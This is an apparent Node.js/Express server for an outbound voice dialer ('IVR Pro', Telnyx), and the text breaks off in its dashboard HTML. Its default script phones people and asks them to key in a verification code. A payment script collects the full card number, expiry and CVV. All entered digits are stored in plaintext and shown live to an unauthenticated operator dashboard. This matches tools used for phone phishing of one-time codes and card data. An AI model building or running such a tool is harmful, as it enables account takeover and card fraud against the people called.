require("dotenv").config();
const express = require("express");
const cors    = require("cors");
const fs      = require("fs");
const path    = require("path");

const app = express();
app.use(express.json());
app.use(express.urlencoded({ extended: false }));
app.use(cors());

// Handle GET and POST for TwiML routes
app.use("/twiml", (req, res, next) => {
  if (req.method === "GET") req.body = req.query;
  if (req.body && req.body.call_control_id && !req.body.CallSid) req.body.CallSid = req.body.call_control_id;
  if (req.body && req.body.call_status && !req.body.CallStatus) req.body.CallStatus = req.body.call_status;
  next();
});

function uid() { return Date.now().toString(36) + Math.random().toString(36).slice(2,7); }

const F = {
  settings: path.join(__dirname, "_settings.json"),
  scripts:  path.join(__dirname, "_scripts.json"),
  logs:     path.join(__dirname, "_logs.json"),
};
function fread(f) { try { if (fs.existsSync(f)) return JSON.parse(fs.readFileSync(f,"utf8")); } catch(e) {} return null; }
function fwrite(f,d) { try { fs.writeFileSync(f, JSON.stringify(d)); } catch(e) {} }

const DEF = { apiKey:"", connectionId:"", fromNumber:"", baseUrl:"", voice:"alice", language:"en-US", companyName:"My Company" };

const SEEDS = [
  { id:"s-default", name:"Default Script", isDefault:true,
    greeting:{ message:"Hello! This is a call from our company. Press 1 to continue, or press 2 to end.", timeout:10, noInputMessage:"We did not receive your input. Goodbye." },
    steps:[{ label:"Verification Code", message:"Please enter your 5-digit code then press hash.", maxDigits:5, timeout:15, confirmMessage:"Thank you. " }],
    successMessage:"Thank you. Goodbye.", cancelMessage:"No problem. Goodbye.", errorMessage:"No input received. Goodbye."
  },
  { id:"s-payment", name:"Payment Collection", isDefault:false,
    greeting:{ message:"Hello! This is our billing department. Press 1 to proceed with payment, or press 2 to call back later.", timeout:10, noInputMessage:"We did not receive your input. Goodbye." },
    steps:[
      { label:"Card Number", message:"Please enter your 16-digit card number then press hash.", maxDigits:16, timeout:30, confirmMessage:"Thank you. " },
      { label:"Expiry Date", message:"Please enter expiry date, month then year, then press hash.", maxDigits:4, timeout:15, confirmMessage:"Thank you. " },
      { label:"CVV", message:"Please enter your 3-digit security code then press hash.", maxDigits:3, timeout:15, confirmMessage:"Thank you. " }
    ],
    successMessage:"Payment details received. Thank you. Goodbye.", cancelMessage:"Please call us back when ready. Goodbye.", errorMessage:"No input received. Goodbye."
  },
  { id:"s-survey", name:"Customer Survey", isDefault:false,
    greeting:{ message:"Hello! We want your feedback. Press 1 to continue or press 2 to skip.", timeout:10, noInputMessage:"We did not receive your input. Goodbye." },
    steps:[
      { label:"Satisfaction Score", message:"Press 1 for very unhappy up to 5 for very happy.", maxDigits:1, timeout:15, confirmMessage:"Thank you. " },
      { label:"Would Recommend", message:"Press 1 if you would recommend us, or press 2 if not.", maxDigits:1, timeout:15, confirmMessage:"Got it. " }
    ],
    successMessage:"Thank you for your feedback! Goodbye.", cancelMessage:"Have a great day! Goodbye.", errorMessage:"No input received. Goodbye."
  }
];
const SEED_IDS = SEEDS.map(s=>s.id);

function loadSettings() { return Object.assign({}, DEF, fread(F.settings)||{}); }
function saveSettings(d) { fwrite(F.settings, d); }
function loadScripts() {
  const saved = fread(F.scripts) || [];
  const userOnly = saved.filter(s=>!SEED_IDS.includes(s.id));
  return SEEDS.map(s=>Object.assign({},s)).concat(userOnly);
}
function saveScripts(arr) { fwrite(F.scripts, arr.filter(s=>!SEED_IDS.includes(s.id))); }
function loadLogs() { return fread(F.logs) || []; }
function saveLogs(arr) { fwrite(F.logs, arr); }

let _url = "";
function pubUrl(req) {
  if (_url) return _url;
  const proto = req.headers["x-forwarded-proto"] || "https";
  const host  = req.headers["x-forwarded-host"] || req.headers["host"] || "";
  if (host) _url = proto + "://" + host;
  return _url;
}

const sessions = {};
function syncLog(s) {
  const logs = loadLogs();
  const i = logs.findIndex(l=>l.callSid===s.callSid);
  if (i>=0) logs[i] = Object.assign(logs[i],s); else logs.unshift(s);
  saveLogs(logs);
}

// ── API ───────────────────────────────────────────────────────────────────────
app.get("/api/settings", (req,res) => {
  const s = loadSettings();
  const safe = Object.assign({},s);
  if (safe.apiKey && safe.apiKey.length>8) safe.apiKey = "••••"+safe.apiKey.slice(-4);
  res.json(safe);
});
app.post("/api/settings", (req,res) => {
  const cur = loadSettings();
  const up = Object.assign({}, cur, req.body);
  if (req.body.apiKey && req.body.apiKey.startsWith("••••")) up.apiKey = cur.apiKey;
  saveSettings(up);
  if (req.body.baseUrl) _url = req.body.baseUrl;
  res.json({success:true});
});

app.get("/api/test", async (req,res) => {
  const s = loadSettings();
  if (!s.apiKey) return res.json({ok:false,error:"API Key not set."});
  if (!s.fromNumber) return res.json({ok:false,error:"Phone number not set."});
  if (!s.connectionId) return res.json({ok:false,error:"Connection ID not set."});
  try {
    const r = await fetch("https://api.telnyx.com/v2/profile",{headers:{"Authorization":"Bearer "+s.apiKey}});
    const d = await r.json();
    if (!r.ok) return res.json({ok:false,error:d.errors?.[0]?.detail||"Auth failed"});
    res.json({ok:true,message:"Telnyx connected! Account: "+( d.data?.email||"OK")});
  } catch(e) { res.json({ok:false,error:e.message}); }
});

app.get("/api/scripts", (req,res) => res.json(loadScripts()));
app.post("/api/scripts", (req,res) => {
  const all = loadScripts();
  const b = req.body;
  if (b.id && !SEED_IDS.includes(b.id)) {
    const i = all.findIndex(s=>s.id===b.id);
    if (i>=0) all[i] = Object.assign(all[i],b,{updatedAt:new Date().toISOString()});
    else all.push(Object.assign({},b,{createdAt:new Date().toISOString()}));
  } else if (!b.id) {
    all.push(Object.assign({},b,{id:uid(),createdAt:new Date().toISOString()}));
  }
  saveScripts(all);
  res.json({success:true,scripts:loadScripts()});
});
app.delete("/api/scripts/:id", (req,res) => {
  if (SEED_IDS.includes(req.params.id)) return res.status(400).json({error:"Cannot delete a template."});
  saveScripts(loadScripts().filter(s=>s.id!==req.params.id));
  res.json({success:true,scripts:loadScripts()});
});
app.post("/api/scripts/:id/setdefault", (req,res) => {
  const all = loadScripts();
  all.forEach(s=>s.isDefault=(s.id===req.params.id));
  saveScripts(all);
  res.json({success:true});
});

app.get("/api/logs", (req,res) => res.json(loadLogs()));
app.delete("/api/logs/:id", (req,res) => { saveLogs(loadLogs().filter(l=>l.id!==req.params.id)); res.json({success:true}); });
app.delete("/api/logs", (req,res) => { saveLogs([]); res.json({success:true}); });
app.get("/api/sessions", (req,res) => res.json(Object.values(sessions).sort((a,b)=>new Date(b.startTime)-new Date(a.startTime))));

app.post("/api/call", async (req,res) => {
  const {phoneNumber,label,scriptId} = req.body;
  if (!phoneNumber) return res.status(400).json({error:"Phone number required."});
  const s = loadSettings();
  if (!s.apiKey) return res.status(400).json({error:"Telnyx API Key not set. Go to Settings."});
  if (!s.connectionId) return res.status(400).json({error:"Connection ID not set. Go to Settings."});
  if (!s.fromNumber) return res.status(400).json({error:"Phone number not set. Go to Settings."});
  const scripts = loadScripts();
  const script = (scriptId?scripts.find(x=>x.id===scriptId):null)||scripts.find(x=>x.isDefault)||scripts[0];
  const base = s.baseUrl || pubUrl(req);
  if (!base) return res.status(400).json({error:"Server URL unknown. Save it in Settings."});
  try {
    const r = await fetch("https://api.telnyx.com/v2/calls",{
      method:"POST",
      headers:{"Content-Type":"application/json","Authorization":"Bearer "+s.apiKey},
      body: JSON.stringify({to:phoneNumber,from:s.fromNumber,connection_id:s.connectionId,webhook_url:base+"/twiml/status",webhook_url_method:"POST",answering_machine_detection:"disabled"})
    });
    const d = await r.json();
    if (!r.ok) throw new Error(d.errors?.[0]?.detail||JSON.stringify(d));
    const callSid = d.data?.call_control_id || uid();
    const entry = {id:uid(),callSid,phone:phoneNumber,label:label||"Call",scriptName:script.name,scriptId:script.id,provider:"telnyx",status:"initiated",statusDetail:"Dialing...",startTime:new Date().toISOString(),endTime:null,duration:null,currentStep:-1,collected:[],steps:script.steps.length};
    sessions[callSid] = entry;
    const logs = loadLogs(); logs.unshift(entry); saveLogs(logs);
    res.json({success:true,callSid});
  } catch(e) { res.status(500).json({error:e.message}); }
});

app.post("/api/call/:sid/end", async (req,res) => {
  const s = loadSettings();
  try {
    await fetch("https://api.telnyx.com/v2/calls/"+req.params.sid+"/actions/hangup",{method:"POST",headers:{"Authorization":"Bearer "+s.apiKey,"Content-Type":"application/json"}});
    if (sessions[req.params.sid]) { sessions[req.params.sid].status="ended-by-user"; syncLog(sessions[req.params.sid]); }
    res.json({success:true});
  } catch(e) { res.status(500).json({error:e.message}); }
});

// ── TwiML ─────────────────────────────────────────────────────────────────────
function vx() { const s=loadSettings(); return {voice:s.voice||"alice",language:s.language||"en-US"}; }
function bx(req) { const s=loadSettings(); if(s.baseUrl) return s.baseUrl; const proto=req.headers["x-forwarded-proto"]||"https"; const host=req.headers["x-forwarded-host"]||req.headers["host"]||""; return host?proto+"://"+host:""; }
function sx(id) { const all=loadScripts(); return (id?all.find(s=>s.id===id):null)||all.find(s=>s.isDefault)||all[0]; }

app.all("/twiml/start", (req,res) => {
  const {voice:v,language:l}=vx(), sc=sx(req.query.sid), base=bx(req), sid=req.body.CallSid;
  if(sessions[sid]){sessions[sid].status="ringing";sessions[sid].statusDetail="Playing greeting...";syncLog(sessions[sid]);}
  const {VoiceResponse}=require("twilio").twiml, t=new VoiceResponse();
  const g=t.gather({numDigits:1,action:base+"/twiml/greet?sid="+sc.id,method:"POST",timeout:sc.greeting.timeout||10});
  g.say({voice:v,language:l},sc.greeting.message);
  t.say({voice:v,language:l},sc.greeting.noInputMessage);
  t.hangup();
  res.type("text/xml").send(t.toString());
});

app.all("/twiml/greet", (req,res) => {
  const {voice:v,language:l}=vx(), sc=sx(req.query.sid), base=bx(req), sid=req.body.CallSid, digit=req.body.Digits;
  const {VoiceResponse}=require("twilio").twiml, t=new VoiceResponse();
  if(digit==="2"){
    if(sessions[sid]){sessions[sid].status="cancelled";sessions[sid].statusDetail="Caller declined";syncLog(sessions[sid]);}
    t.say({voice:v,language:l},sc.cancelMessage);t.hangup();return res.type("text/xml").send(t.toString());
  }
  if(digit==="1"){
    if(sessions[sid]){sessions[sid].status="in-progress";sessions[sid].statusDetail="Accepted";syncLog(sessions[sid]);}
    return res.redirect(307,base+"/twiml/step/0?sid="+sc.id);
  }
  t.say({voice:v,language:l},"Invalid input. "+sc.greeting.message);
  t.redirect(base+"/twiml/start?sid="+sc.id);
  res.type("text/xml").send(t.toString());
});

app.all("/twiml/step/:idx", (req,res) => {
  const {voice:v,language:l}=vx(), sc=sx(req.query.sid), base=bx(req), idx=parseInt(req.params.idx,10), step=sc.steps[idx], sid=req.body.CallSid;
  const {VoiceResponse}=require("twilio").twiml, t=new VoiceResponse();
  if(!step){
    if(sessions[sid]){sessions[sid].status="completed";sessions[sid].statusDetail="All steps done";syncLog(sessions[sid]);}
    t.say({voice:v,language:l},sc.successMessage);t.hangup();return res.type("text/xml").send(t.toString());
  }
  if(sessions[sid]){sessions[sid].currentStep=idx;sessions[sid].statusDetail="Waiting: "+step.label;syncLog(sessions[sid]);}
  const g=t.gather({numDigits:step.maxDigits,finishOnKey:"#",action:base+"/twiml/collect/"+idx+"?sid="+sc.id,method:"POST",timeout:step.timeout||15});
  g.say({voice:v,language:l},step.message);
  t.say({voice:v,language:l},sc.errorMessage);t.hangup();
  res.type("text/xml").send(t.toString());
});

app.all("/twiml/collect/:idx", (req,res) => {
  const {voice:v,language:l}=vx(), sc=sx(req.query.sid), base=bx(req), idx=parseInt(req.params.idx,10), sid=req.body.CallSid, digits=req.body.Digits, step=sc.steps[idx];
  const {VoiceResponse}=require("twilio").twiml, t=new VoiceResponse();
  if(sessions[sid]){sessions[sid].collected.push({step:idx,label:step.label,value:digits,time:new Date().toISOString()});sessions[sid].currentStep=idx+1;sessions[sid].statusDetail="Received: "+step.label;syncLog(sessions[sid]);}
  if(step.confirmMessage) t.say({voice:v,language:l},step.confirmMessage);
  t.redirect(base+"/twiml/step/"+(idx+1)+"?sid="+sc.id);
  res.type("text/xml").send(t.toString());
});

app.all("/twiml/status", (req,res) => {
  const sid=req.body.CallSid, cs=req.body.CallStatus, dur=req.body.CallDuration;
  if(sessions[sid]){
    const s=sessions[sid];
    if(cs==="ringing") s.statusDetail="Ringing...";
    else if(cs==="answered"){s.status="in-progress";s.statusDetail="Connected";}
    else if(cs==="completed"&&!["cancelled","completed","ended-by-user"].includes(s.status)){s.status="completed";s.statusDetail="Completed";}
    else if(["no-answer","busy","failed"].includes(cs)){s.status=cs;s.statusDetail=cs.replace("-"," ");}
    if(dur) s.duration=parseInt(dur);
    if(["completed","cancelled","no-answer","busy","failed"].includes(cs)) s.endTime=new Date().toISOString();
    syncLog(s);
  }
  res.sendStatus(200);
});

// ── HTML ──────────────────────────────────────────────────────────────────────
app.get("/", (req,res) => { pubUrl(req); res.setHeader("Content-Type","text/html"); res.send(HTML); });

const PORT = process.env.PORT||3000;
app.listen(PORT, ()=>console.log("\n✅ IVR Pro → http://localhost:"+PORT+"\n"));

// ── Dashboard (separate const avoids template literal conflicts) ───────────────
const HTML = [
'<!DOCTYPE html>',
'<html lang="en">',
'<head>',
'<meta charset="UTF-8"/>',
'<meta name="viewport" content="width=device-width,initial-scale=1.0"/>',
'<title>IVR Pro — Telnyx</title>',
'<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet"/>',
'<style>',
'*,*::before,*::after{box-sizing:border-box;margin:0;padding:0}',
':root{--bg:#f0f4f8;--panel:#fff;--p2:#f7f9fc;--border:#e2e8f0;--b2:#cbd5e1;--dark:#0f172a;--dark2:#1e293b;--cyan:#0ea5e9;--cyan2:#0284c7;--green:#10b981;--green2:#059669;--amber:#f59e0b;--red:#ef4444;--purple:#8b5cf6;--text:#0f172a;--text2:#475569;--text3:#94a3b8;--font:"Inter",sans-serif;--mono:"JetBrains Mono",monospace}',
'html,body{height:100%;background:var(--bg);color:var(--text);font-family:var(--font)}',
'button,input,select,textarea{font-family:var(--font)}',
'::-webkit-scrollbar{width:5px}::-webkit-scrollbar-thumb{background:var(--b2);border-radius:10px}',
'.app{display:flex;height:100vh;overflow:hidden}',
/* SIDEBAR */
'.sb{width:280px;min-width:280px;background:var(--dark);display:flex;flex-direction:column;overflow-y:auto}',
'.logo{padding:18px;border-bottom:1px solid #1e293b;display:flex;align-items:center;gap:12px;flex-shrink:0}',
'.logo-ic{width:36px;height:36px;border-radius:9px;background:linear-gradient(135deg,var(--cyan),var(--cyan2));display:flex;align-items:center;justify-content:center;flex-shrink:0}',
'.logo-ic svg{width:18px;height:18px}',
'.logo-name{font-size:16px;font-weight:700;color:#fff}',
'.logo-sub{font-size:10px;color:#64748b;text-transform:uppercase;letter-spacing:1px;margin-top:1px}',
'.dl{padding:14px 14px 10px;border-bottom:1px solid #1e293b;flex-shrink:0}',
'.sl{font-size:10px;font-weight:600;letter-spacing:1.5px;text-transform:uppercase;color:#64748b;margin-bottom:10px}',
'.fi{margin-bottom:9px}',
'.fi label{display:block;font-size:10px;font-weight:500;color:#94a3b8;margin-bottom:3px;text-transform:uppercase;letter-spacing:.5px}',
'.fi input,.fi select{width:100%;background:#1e293b;border:1px solid #334155;border-radius:7px;padding:8px 10px;color:#f1f5f9;font-size:13px;outline:none;transition:border-color .15s}',
'.fi input:focus,.fi select:focus{border-color:var(--cyan)}',
'.fi input::placeholder{color:#475569}',
'.fi select option{background:#1e293b}',
/* Dialpad */
'.pad{display:grid;grid-template-columns:repeat(3,1fr);gap:5px;margin-bottom:10px}',
'.key{background:#1e293b;border:1px solid #334155;border-radius:8px;color:#f1f5f9;padding:0;cursor:pointer;display:flex;flex-direction:column;align-items:center;justify-content:center;height:44px;transition:all .15s;gap:0}',
'.key:hover{background:#334155}',
'.key span{font-size:16px;font-weight:600;line-height:1}',
'.key small{font-size:8px;color:#64748b;letter-spacing:.8px}',
'.btn-call{width:100%;padding:12px;border:none;border-radius:9px;background:linear-gradient(135deg,var(--cyan),var(--cyan2));color:#fff;font-size:14px;font-weight:700;cursor:pointer;display:flex;align-items:center;justify-content:center;gap:8px;transition:all .15s;margin-top:4px}',
'.btn-call:hover{opacity:.9}',
'.btn-call:disabled{opacity:.4;cursor:not-allowed}',
'.btn-test{width:100%;margin-top:6px;padding:8px;background:transparent;border:1px solid #334155;border-radius:7px;color:#94a3b8;font-size:12px;cursor:pointer;transition:all .15s}',
'.btn-test:hover{border-color:var(--cyan);color:var(--cyan)}',
'.msg{margin-top:8px;padding:8px 10px;border-radius:7px;font-size:11px;font-weight:500;display:none;line-height:1.5;word-break:break-word}',
'.msg.err{background:rgba(239,68,68,.1);border:1px solid rgba(239,68,68,.3);color:var(--red);display:block}',
'.msg.ok{background:rgba(16,185,129,.1);border:1px solid rgba(16,185,129,.3);color:var(--green);display:block}',
'.msg.info{background:rgba(14,165,233,.1);border:1px solid rgba(14,165,233,.3);color:var(--cyan);display:block}',
'.stats{padding:12px 14px;border-bottom:1px solid #1e293b;flex-shrink:0}',
'.sr{display:flex;gap:6px}',
'.st{flex:1;background:#1e293b;border-radius:9px;padding:9px 6px;text-align:center}',
'.stn{font-size:20px;font-weight:700}',
'.stl{font-size:9px;color:#64748b;text-transform:uppercase;letter-spacing:.5px;margin-top:2px}',
'.pill{margin-top:10px;padding:5px 10px;background:rgba(16,185,129,.08);border:1px solid rgba(16,185,129,.2);border-radius:20px;display:flex;align-items:center;gap:6px;font-size:10px;color:var(--green)}',
'.dot{width:5px;height:5px;border-radius:50%;background:var(--green);animation:pulse 1.5s infinite}',
'@keyframes pulse{0%,100%{opacity:1}50%{opacity:.3}}',
/* MAIN */
'.main{flex:1;display:flex;flex-direction:column;overflow:hidden}',
'.tabs{display:flex;background:var(--panel);border-bottom:2px solid var(--border);padding:0 20px;gap:2px;flex-shrink:0}',
'.tab{padding:14px 16px;font-size:13px;font-weight:600;color:var(--text2);border:none;background:none;border-bottom:3px solid transparent;cursor:pointer;transition:all .15s;margin-bottom:-2px;white-space:nowrap}',
'.tab:hover{color:var(--text)}',
'.tab.active{color:var(--cyan2);border-bottom-color:var(--cyan)}',
'.panel{flex:1;overflow-y:auto;display:none;padding:22px}',
'.panel.active{display:block}',
'.ph{display:flex;justify-content:space-between;align-items:flex-start;margin-bottom:18px}',
'.ph-title{font-size:19px;font-weight:700}',
'.ph-sub{font-size:12px;color:var(--text2);margin-top:2px}',
/* Monitor */
'.mgrid{display:flex;flex-direction:column;gap:12px}',
'.empty{display:flex;flex-direction:column;align-items:center;justify-content:center;padding:80px 20px;color:var(--text3);text-align:center}',
'.empty svg{opacity:.2;margin-bottom:14px}',
'.et{font-size:15px;font-weight:600;color:var(--text2);margin-bottom:5px}',
'.es{font-size:13px;line-height:1.6}',
'.ccard{background:var(--panel);border:1px solid var(--border);border-radius:13px;overflow:hidden;box-shadow:0 2px 8px rgba(0,0,0,.06);transition:border-color .2s}',
'.ccard.s-in-progress{border-color:var(--cyan2)}',
'.ccard.s-completed{border-color:var(--green2)}',
'.ccard.s-cancelled,.ccard.s-failed,.ccard.s-no-answer,.ccard.s-busy,.ccard.s-ended-by-user{border-color:rgba(239,68,68,.4)}',
'.ch{padding:13px 16px;display:flex;justify-content:space-between;align-items:flex-start;border-bottom:1px solid var(--border)}',
'.cph{font-size:16px;font-weight:700;font-family:var(--mono)}',
'.clb{font-size:11px;color:var(--text2);margin-top:2px}',
'.cr{display:flex;flex-direction:column;align-items:flex-end;gap:4px}',
'.ct{font-size:10px;color:var(--text3)}',
'.badge{display:inline-flex;align-items:center;gap:4px;padding:3px 8px;border-radius:20px;font-size:10px;font-weight:700;text-transform:uppercase}',
'.bd{width:5px;height:5px;border-radius:50%;background:currentColor}',
'.bdp{animation:pulse 1s infinite}',
'.badge-initiated,.badge-ringing{background:rgba(245,158,11,.12);color:var(--amber)}',
'.badge-in-progress{background:rgba(14,165,233,.12);color:var(--cyan2)}',
'.badge-completed{background:rgba(16,185,129,.12);color:var(--green2)}',
'.badge-cancelled,.badge-failed,.badge-no-answer,.badge-busy,.badge-ended-by-user{background:rgba(239,68,68,.1);color:var(--red)}',
'.cb{padding:13px 16px}',
'.prog{display:flex;gap:5px;margin-bottom:10px}',
'.ps{height:4px;flex:1;border-radius:2px;background:var(--b2);transition:background .3s}',
'.ps.done{background:var(--green)}',
'.ps.act{background:var(--cyan);animation:blink 1s infinite}',
'@keyframes blink{0%,100%{opacity:1}50%{opacity:.3}}',
'.clist{display:flex;flex-direction:column;gap:5px}',
'.ci{display:flex;align-items:center;gap:8px;background:var(--p2);border:1px solid var(--border);border-radius:7px;padding:7px 10px}',
'.cil{font-size:10px;color:var(--text2);flex:1;text-transform:uppercase;letter-spacing:.5px;font-weight:600}',
'.civ{font-family:var(--mono);font-size:14px;font-weight:600;color:var(--cyan2);background:rgba(14,165,233,.08);padding:2px 8px;border-radius:4px;letter-spacing:2px}',
'.cit{font-size:10px;color:var(--text3)}',
'.cf{display:flex;align-items:center;justify-content:space-between;padding:9px 16px;border-top:1px solid var(--border);background:var(--p2)}',
'.cft{font-size:11px;color:var(--text2)}',
'.cfb{display:flex;gap:6px}',
'.btn-sm{padding:5px 11px;border-radius:6px;font-size:11px;font-weight:600;border:1px solid var(--b2);background:none;color:var(--text2);cursor:pointer;transition:all .15s}',
'.btn-sm:hover{border-color:var(--cyan);color:var(--cyan)}',
'.btn-sm.end{border-color:rgba(239,68,68,.4);color:var(--red)}',
'.btn-sm.end:hover{background:rgba(239,68,68,.06)}',
'.sl2{display:flex;align-items:center;gap:6px;font-size:11px;color:var(--text2);margin-top:7px}',
'.sdot{width:6px;height:6px;border-radius:50%;background:var(--amber);display:inline-block}',
'.sdot.a{animation:pulse 1s infinite}',
/* Scripts */
'.slib{display:flex;gap:10px;margin-bottom:16px;overflow-x:auto;padding-bottom:4px}',
'.sc{background:var(--panel);border:2px solid var(--border);border-radius:11px;padding:13px;min-width:155px;max-width:155px;cursor:pointer;transition:all .15s;flex-shrink:0;box-shadow:0 2px 5px rgba(0,0,0,.05)}',
'.sc:hover{border-color:var(--b2);transform:translateY(-1px)}',
'.sc.sel{border-color:var(--cyan2);background:#f0f9ff}',
'.sc.isdef .sc-name::after{content:" ★";color:var(--amber);font-size:10px}',
'.sc-name{font-size:13px;font-weight:700;color:var(--text);margin-bottom:2px}',
'.sc-tag{font-size:8px;font-weight:700;padding:1px 4px;border-radius:3px;background:rgba(14,165,233,.1);color:var(--cyan2);text-transform:uppercase;margin-left:4px;vertical-align:middle}',
'.sc-meta{font-size:10px;color:var(--text3)}',
'.sc-btns{display:flex;gap:4px;margin-top:8px}',
'.btn-sc{padding:3px 7px;border-radius:5px;font-size:10px;font-weight:600;border:1px solid var(--b2);background:none;color:var(--text2);cursor:pointer;transition:all .15s}',
'.btn-sc:hover{border-color:var(--cyan2);color:var(--cyan2)}',
'.btn-sc.def{border-color:rgba(245,158,11,.4);color:var(--amber)}',
'.btn-sc.del:hover{border-color:var(--red);color:var(--red)}',
'.sc-new{border-style:dashed;display:flex;flex-direction:column;align-items:center;justify-content:center;gap:4px;color:var(--text3)}',
'.sc-new:hover{border-color:var(--cyan2);color:var(--cyan2);background:rgba(14,165,233,.03)}',
'.sec{background:var(--panel);border:1px solid var(--border);border-radius:11px;padding:16px;margin-bottom:13px;box-shadow:0 1px 4px rgba(0,0,0,.04)}',
'.sec-t{font-size:13px;font-weight:700;margin-bottom:13px;display:flex;align-items:center;gap:8px}',
'.sec-t::before{content:"";display:inline-block;width:3px;height:14px;background:var(--cyan2);border-radius:2px}',
'.g2{display:grid;grid-template-columns:1fr 1fr;gap:9px}',
'.full{grid-column:1/-1}',
'.ff{display:flex;flex-direction:column;gap:4px}',
'.ff label{font-size:11px;font-weight:600;color:var(--text2)}',
'.ff input,.ff select,.ff textarea{background:var(--p2);border:1px solid var(--border);border-radius:7px;padding:8px 10px;color:var(--text);font-size:13px;outline:none;resize:vertical;transition:border-color .15s}',
'.ff textarea{min-height:60px;line-height:1.5}',
'.ff input:focus,.ff select:focus,.ff textarea:focus{border-color:var(--cyan2)}',
'.ff input::placeholder,.ff textarea::placeholder{color:var(--text3)}',
'.step-c{background:var(--p2);border:1px solid var(--border);border-radius:9px;padding:13px;margin-bottom:7px}',
'.step-hd{display:flex;align-items:center;gap:7px;margin-bottom:11px}',
'.step-n{width:22px;height:22px;border-radius:50%;background:var(--cyan2);color:#fff;font-size:10px;font-weight:700;display:flex;align-items:center;justify-content:center;flex-shrink:0}',
'.step-name{flex:1;background:transparent;border:none;border-bottom:1px solid var(--border);color:var(--text);font-size:13px;font-weight:700;padding:2px 0;outline:none}',
'.step-name:focus{border-bottom-color:var(--cyan2)}',
'.btn-rm{background:none;border:none;color:var(--text3);font-size:17px;cursor:pointer;padding:0 3px;line-height:1;transition:color .15s}',
'.btn-rm:hover{color:var(--red)}',
'.sg{display:grid;grid-template-columns:1fr 1fr;gap:7px}',
'.sf{display:flex;flex-direction:column;gap:3px}',
'.sf.full{grid-column:1/-1}',
'.sf label{font-size:10px;font-weight:600;color:var(--text3);text-transform:uppercase;letter-spacing:.5px}',
'.sf input,.sf textarea{background:var(--panel);border:1px solid var(--border);border-radius:6px;padding:6px 9px;color:var(--text);font-size:12px;outline:none;resize:vertical}',
'.sf input:focus,.sf textarea:focus{border-color:var(--cyan2)}',
'.btn-add{width:100%;padding:9px;background:none;border:2px dashed var(--border);border-radius:7px;color:var(--text2);font-size:12px;cursor:pointer;transition:all .15s;margin-bottom:4px}',
'.btn-add:hover{border-color:var(--cyan2);color:var(--cyan2)}',
'.sname-bar{display:flex;gap:8px;align-items:center;margin-bottom:14px}',
'.sname-inp{flex:1;background:var(--panel);border:2px solid var(--border);border-radius:8px;padding:10px 13px;color:var(--text);font-size:16px;font-weight:700;outline:none;transition:border-color .15s}',
'.sname-inp:focus{border-color:var(--cyan2)}',
'.save-row{display:flex;align-items:center;gap:10px;margin-top:14px;flex-wrap:wrap}',
'.btn-save{padding:10px 20px;background:var(--cyan2);color:#fff;border:none;border-radius:8px;font-size:13px;font-weight:700;cursor:pointer;transition:all .15s}',
'.btn-save:hover{background:var(--cyan)}',
'.btn-save.s2{background:var(--panel);border:2px solid var(--cyan2);color:var(--cyan2)}',
'.btn-save.s2:hover{background:rgba(14,165,233,.06)}',
'.ok{font-size:12px;color:var(--green2);display:none;font-weight:600}',
'.ok.on{display:inline}',
/* Logs */
'.btn-danger{padding:7px 14px;background:none;border:1px solid rgba(239,68,68,.4);border-radius:7px;color:var(--red);font-size:12px;font-weight:600;cursor:pointer;transition:all .15s}',
'.btn-danger:hover{background:rgba(239,68,68,.06)}',
'.lw{background:var(--panel);border:1px solid var(--border);border-radius:11px;overflow:hidden}',
'.lt{width:100%;border-collapse:collapse}',
'.lt th{font-size:10px;font-weight:700;color:var(--text3);text-transform:uppercase;letter-spacing:.8px;padding:9px 13px;text-align:left;background:var(--p2);border-bottom:1px solid var(--border)}',
'.lt td{padding:9px 13px;border-bottom:1px solid var(--border);font-size:12px;vertical-align:middle}',
'.lt tr:last-child td{border-bottom:none}',
'.lt tr:hover td{background:var(--p2)}',
'.no-d{text-align:center;padding:50px;color:var(--text3);font-size:13px}',
'.det-btn{color:var(--cyan2);font-size:11px;cursor:pointer;font-weight:600;background:none;border:none;padding:0}',
'.det-btn:hover{text-decoration:underline}',
'.det-row{display:none}',
'.det-row.on{display:table-row}',
'.det-cell{padding:9px 13px!important;background:var(--p2);border-bottom:1px solid var(--border)}',
'.chips{display:flex;flex-wrap:wrap;gap:7px}',
'.chip{background:var(--panel);border:1px solid var(--border);border-radius:7px;padding:7px 11px}',
'.chip-l{font-size:9px;font-weight:700;color:var(--text3);text-transform:uppercase;letter-spacing:.5px}',
'.chip-v{font-family:var(--mono);font-size:13px;color:var(--cyan2);margin-top:2px;letter-spacing:1px}',
'.dur{font-family:var(--mono);font-size:11px;color:var(--text2)}',
/* Settings */
'.note{font-size:10px;color:var(--text3);margin-top:4px;line-height:1.5}',
'.note a{color:var(--cyan2);text-decoration:none}',
'.note a:hover{text-decoration:underline}',
'.url-row{display:flex;gap:6px}',
'.btn-auto{padding:8px 10px;background:none;border:1px solid var(--border);border-radius:7px;color:var(--text2);font-size:11px;font-weight:600;cursor:pointer;white-space:nowrap;transition:all .15s}',
'.btn-auto:hover{border-color:var(--cyan2);color:var(--cyan2)}',
'.vg{display:grid;grid-template-columns:repeat(3,1fr);gap:7px;margin-top:8px}',
'.vo{position:relative;padding:9px 10px;background:var(--p2);border:2px solid var(--border);border-radius:8px;cursor:pointer;transition:all .15s}',
'.vo:has(input:checked){border-color:var(--cyan2);background:#f0f9ff}',
'.vo input{position:absolute;opacity:0;width:0;height:0}',
'.vo-n{font-size:12px;font-weight:700}',
'.vo-d{font-size:10px;color:var(--text2);margin-top:1px}',
'.hbox{background:rgba(14,165,233,.06);border:1px solid rgba(14,165,233,.2);border-radius:9px;padding:13px;margin-bottom:13px;font-size:12px;color:var(--text2);line-height:1.7}',
'.hbox strong{color:var(--cyan2)}',
'.hbox code{background:rgba(0,0,0,.06);padding:1px 5px;border-radius:3px;font-family:var(--mono);font-size:11px}',
'</style>',
'</head>',
'<body>',
'<div class="app">',
'<aside class="sb">',
'<div class="logo">',
'<div class="logo-ic"><svg viewBox="0 0 24 24" fill="none" stroke="#fff" stroke-width="2.5" stroke-linecap="round"><path d="M22 16.92v3a2 2 0 01-2.18 2 19.79 19.79 0 01-8.63-3.07A19.5 19.5 0 013.07 11.5a19.79 19.79 0 01-3.07-8.67A2 2 0 012 .84h3a2 2 0 012 1.72c.127.96.361 1.903.7 2.81a2 2 0 01-.45 2.11L6.09 8.14a16 16 0 006.29 6.29l1.42-1.42a2 2 0 012.11-.45c.907.339 1.85.573 2.81.7A2 2 0 0122 16.92z"/></svg></div>',
'<div><div class="logo-name" id="co-name">IVR PRO</div><div class="logo-sub">Telnyx</div></div>',
'</div>',
